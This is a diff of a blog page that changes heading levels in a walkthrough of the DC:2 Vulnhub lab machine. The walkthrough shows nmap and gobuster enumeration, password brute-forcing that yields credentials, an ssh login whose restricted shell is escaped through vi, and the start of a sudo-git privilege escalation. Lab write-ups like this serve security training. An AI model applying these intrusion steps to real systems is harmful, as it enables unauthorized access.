@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<h2 class=blog-title>DC:2 Vulnhub Walkthrough</h2>
 <p><span>September 25, 2020</span> by <span>Nasef</span></p>
+<h2 class=blog-title>DC:2 Vulnhub Walkthrough</h2>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>DC:2 is a machine in which I used an enumration to credintials and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h3 id=scanning>Scanning</h3>
+<h2 id=scanning>Scanning</h2>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sC -sV -p- 192.168.198.142
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 06:55 EDT
@@ -82,7 +82,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.20 seconds
 
 </code></pre><p>Http and ssh are open.</p>
-<h3 id=directory-enumeration>Directory Enumeration</h3>
+<h2 id=directory-enumeration>Directory Enumeration</h2>
 <p>Then I enumerated directories and files using gobuster</p>
 <pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dc-2/ -e php,html,txt,flag,js,json
 ===============================================================
@@ -107,7 +107,7 @@ http://dc-2/server-status (Status: 403)
 2020/09/27 06:59:35 Finished                                                                                      
 ===============================================================   
 </code></pre><p>Just the default directories and nothing interesting.</p>
-<h3 id=web-enumeration>Web Enumeration</h3>
+<h2 id=web-enumeration>Web Enumeration</h2>
 <p>Using manual browsing I found the first flag.</p>
 <p><img src=/images/blog/005/1.png alt=Username></p>
 <p>This message implied that I use this tool to generate the wordlist</p>
@@ -243,7 +243,7 @@ Trying admin / log Time: 00:00:44 &lt;==========================================
 
 </code></pre><p>So, I got two users' credinatials! I logged in as jerry and found the next flag
 <img src=/images/blog/005/2.png alt=Username></p>
-<h3 id=from-tom-to-jerry>From Tom to Jerry</h3>
+<h2 id=from-tom-to-jerry>From Tom to Jerry</h2>
 <p>The first thing I thought of from this hint is to ssh. So, I sshed as Tom but with restriected shell ! I bypassed it using using vi.</p>
 <pre><code>root@kali:/home/kali# ssh -p 7744 tom@192.168.198.142
 tom@192.168.198.142's password: 
@@ -279,7 +279,7 @@ You still need to get the final flag (the only flag that really counts!!!).
 No hints here - you're on your own now.  :-)
 
 Go on - git outta here!!!!
-</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
+</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
 <p>I ran diffrenet Enumeration scripts and found an intersting sudo privilege which allows us to run git as root. after searching in the gtfio of how to get a root shell. I ran the following commands.</p>
 <pre><code>erry@DC-2:~$ sudo -l
 Matching Defaults entries for jerry on DC-2:
